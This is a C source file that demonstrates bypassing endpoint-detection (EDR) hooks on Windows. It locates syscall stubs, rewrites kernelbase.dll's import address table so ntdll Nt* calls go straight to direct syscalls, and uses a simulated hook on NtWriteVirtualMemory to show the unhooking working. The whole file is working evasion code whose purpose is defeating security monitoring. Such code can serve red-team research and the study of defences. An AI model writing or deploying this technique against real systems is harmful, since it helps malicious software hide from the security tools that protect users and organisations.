#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include "rawcalls.h"
void* ptrs[10000] = {0};
extern void* sysc();
void generate(){
    hunt();
    for(unsigned int i=0;i<totalFns;i++){
        ptrs[i] = sysc+(i*10);
    }
}
int unhook(){
    generate();
    //kernel32.dll actually calls down to kernelbase.dll. unhooking kernel32.dll's IAT is fully ineffective.
    LPVOID imageBase = getDllAddr(L"kernelbase.dll");
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);

	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)imageBase);
	LPCSTR libraryName = NULL;
	PIMAGE_IMPORT_BY_NAME functionName = NULL; 
	while (importDescriptor->Name){
		libraryName = (LPCSTR)(importDescriptor->Name + imageBase);
		if(strcmp(libraryName, "ntdll.dll")==0){
		    break;
	    }
		importDescriptor++;
	}
	PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;
	originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->OriginalFirstThunk);
	firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->FirstThunk);
	PIMAGE_THUNK_DATA bft = originalFirstThunk;
	while (bft->u1.AddressOfData) bft++;
	DWORD oldProtect = 0;
	LPVOID ft = (LPVOID)(&firstThunk->u1.Function);
	size_t sz = sizeof(void*) * (unsigned long long)(bft-originalFirstThunk);
	VirtualProtect((LPVOID)(&firstThunk->u1.Function), sz, PAGE_READWRITE, &oldProtect);
	while (originalFirstThunk->u1.AddressOfData){
		functionName = (PIMAGE_IMPORT_BY_NAME)(imageBase + (unsigned int)originalFirstThunk->u1.AddressOfData);
		char* name = functionName->Name;
		if (memcmp(name, "Nt", 2)==0 && memcmp(name, "Ntdll", 5)!=0){
		    int syscall = getSysId(name);
		    if(syscall!=-1){
		        firstThunk->u1.Function = (DWORD_PTR)(ptrs[syscall]);
	        }
		}
		++originalFirstThunk;
		++firstThunk;
	}
	VirtualProtect((LPVOID)(&firstThunk->u1.Function), sz, oldProtect, &oldProtect);
}
int main(){
    const char patch[8]="\x90\x90\x90\x90\x90\x90\xc3";
    size_t jonk = 0;
    //sample hook
    void* ntwvm = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
    printf("Original NtWriteVirtualMemory:\n");
    for(int i=0;i<10;i++) printf("\\x%02x", ((unsigned char*)ntwvm)[i]);
    printf("\n");
    
    WriteProcessMemory(GetCurrentProcess(), ntwvm, patch, 7, &jonk);
	printf("patched\n\n");
	char jonklr = 'j';
    char tojonk = 'k';
    WriteProcessMemory(GetCurrentProcess(), &jonklr, &tojonk, 1, &jonk);
    printf("Byte (unchanged): %c\nPatched NtWriteVirtualMemory:\n", jonklr);
    for(int i=0;i<10;i++) printf("\\x%02x", ((unsigned char*)ntwvm)[i]);
    printf("\n\n");
    
    unhook();
    printf("unhooked\n");
	WriteProcessMemory(GetCurrentProcess(), &jonklr, &tojonk, 1, &jonk);
	printf("Byte (changed): %c\nUnhooked NtWriteVirtualMemory - what the EDR sees:\n", jonklr);
	for(int i=0;i<10;i++) printf("\\x%02x", ((unsigned char*)ntwvm)[i]);
    printf("\n");
	getchar();
	return 0;
}